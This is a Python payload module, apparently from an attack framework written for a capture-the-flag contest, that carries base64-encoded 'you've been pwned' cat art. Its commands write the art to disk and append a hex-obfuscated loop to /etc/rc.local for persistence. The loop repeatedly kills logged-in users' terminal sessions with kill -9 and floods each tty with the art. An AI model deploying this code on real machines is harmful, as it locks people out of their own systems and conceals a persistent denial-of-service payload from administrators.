#!/usr/bin/python3

from ..base import Payload
from ...utils.encoding import hex_repr
import base64

cat_64 = """
CiAgICAtCiAgICB5bS8KICAgIHlNTW0vICAgICAgICAgICAgICAgICAgICBgYGAgICAgICAgICAg
ICAgICAuKy8KICAgIHNNTU1NbS8gICAgICAgICAgLjo6Ojo6b29vb29vbys6LSAgICAgICAtb2RN
TmAKICAgIG9NTU5OTU1tLyAgICAgICAvb29vb29vb29vb29vb29vbysuIGA6c21NTU1NbwogICAg
b01NbS5zTk1NZC8gICAgL29vb29vb29vb29vb29vb29vb29zTk1NTU1NTW1gCiAgICArTU1OICAu
c05NTWQ6Li9vK2AgYC46Lysrb29vb29vb29vb3lOaCstTU1NLwogICAgK01NTiAgICAueXlzb29v
b286LWAgICAgICAgYGBgYGAgLW9vLiAgeU1NbQogICAgL01NTWAgICBgb29vb29vb29vb29vKy86
Oi0tLS0tLS0tL29vLy0tTU1NOgogICAgOk1NTWAgIC4veWRzb29vb29vb29vb29vb29vb29vb29v
b29vb29vaE1oCiAgICA6TU1Nc2hOTU1NTU1OZGh5c29vb29vb29vb29vb29vb29vb29vb295TS0K
ICAgIC1NTU1NTU1NTU1NTU1NTU1NTm1kZGh5eXNzc3Nvc29zc3N5aGhkTk15CiAgICAvTU1NTU1N
TU1NTU1NTU1NTU1NTU1NTnkvLS4uLS9zbU1NTU1NTU1NOgogICBvTU1NTU1NTU1NTmh5aGRNTU1N
TU1Nb2AgICAgICAgICAvbU1NTU1NTU4vCiAgc01NTU1NTU1NaC0gICAgIC5vTU1NTTogICAgICAg
ICAgICAubU1NTU1NTU0vCiArTU1NTU1NTU15ICAgICAgICAgOk1NaCAgICAgICAgICAgICAgL01N
TU1NTU1NLQpgTk1NTU1NTU1NOiAgIC5vby0gICBOTXMgICBgeU5Oby9gICAgIC1NTU1NTU1NTWQK
L01NTU1NTU1NTW8gICBOTW1zOiAuTU1tICAgc01NTnNkKyAgICBvTU1NTU1NTU1NLgpvTU1NTU1N
TU1NTSsgIC1zcy8gLW1NTU15YCAuaE5NTnlgICAgL01NTU1NTU1NTU06CitNTU1NTU1NTU1NTW1z
Ky8vb2RNTU1NTU1tL2AgIGAgICAgLXlNTU1NTU1NTU1NTS0KLU1NTU1NTU1NTU1NTU1NTU1NTU5z
b29vb2RNTmhzb29veW1NTU1NTU1NTU1NTU1OYAogaE1NTU1NTU1NTU1NTU1NTU1NTU4rIDpkTU1N
TU1NTU1NTU1NTU1NTU1NTU1NTW8KIC5OTU1NTU1NTU1NTU1NTU1NTU1NTU5NTU1NTU1NTU1NTU1N
TU1NTU1NTU1NTWRgCiAgLU5NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1N
TWRgCiAgIC5oTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1Nc2AKICAgICAr
bU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NZDoKICAgICAgYCttTU1NTU1NTU1N
TU1NTU1NTU1NTU1NTU1NTU1NTU1NTWg6CiAgICAgICAgIDpzbU1NTU1NTU1NTU1NTU1NTU1NTU1N
TU1NTU1kby4KICAgICAgICAgICAgLi9oTU1NTU1NTU1NTU1NTU1NTU1NTW8tYAogICAgICAgICAg
ICAgLk5NTU1NTU1NTU1NTU1NTU1NTU1NZGAKICAgICAgICAgICAgIGRNTU1NTU1NTU1NTU1NTU1N
TU1NTU0vCiAgICAgICAgICAgIC5NTU1NTU1NTU1NTU1NTU1NTU1NTU1NcwogICAgICAgICAgICBg
TU1NTU1NTU1NTU1NTU1NTU1NTU1NTW8KICAgICAgICAgICAgIHlNTU1NTU1NTU1NTU1NTU1NTU1N
TU4uICAgYC4tLgouICArKy86LiAgICAgLm1NTU1NTU1NTU1NTU1NTU1NTU1NTm1OTk1ObWRzLi0v
Ky8KICAgICAgIFlPVSdWRSBCRUVOIFBXTkVEIEJZIE5VUyBHUkVZSEFUUwogICAgIE5BTkRZIE5B
UldIQUxTIFJFUFJFU0VOVFMgLSBERUZDT04gU0cK
"""

class Cat(Payload):

    cat_location = "/usr/etc/cat.log"

    def __init__(self):
        self.commands = []
        self.cat_ascii = cat_64.replace("\n", "")
        self.commands.append("echo %s | base64 -d > %s" % (self.cat_ascii,
                                                           self.cat_location))
        evil_command = ("while true; do for i in {1..7}; do who -p -u | "
                        "grep -e tty -e pts| awk '{ print $6 }' | xargs -n1 kill "
                        "-9; cat %s > /dev/tty$i; done; sleep 0.1; done "
                        "2>/dev/null &" % self.cat_location)
        self.persistence = hex_repr(evil_command)
        self.commands.append("printf '%s' >> /etc/rc.local" % self.persistence)
        self.commands.append(evil_command)

    def steps(self):
        return self.commands


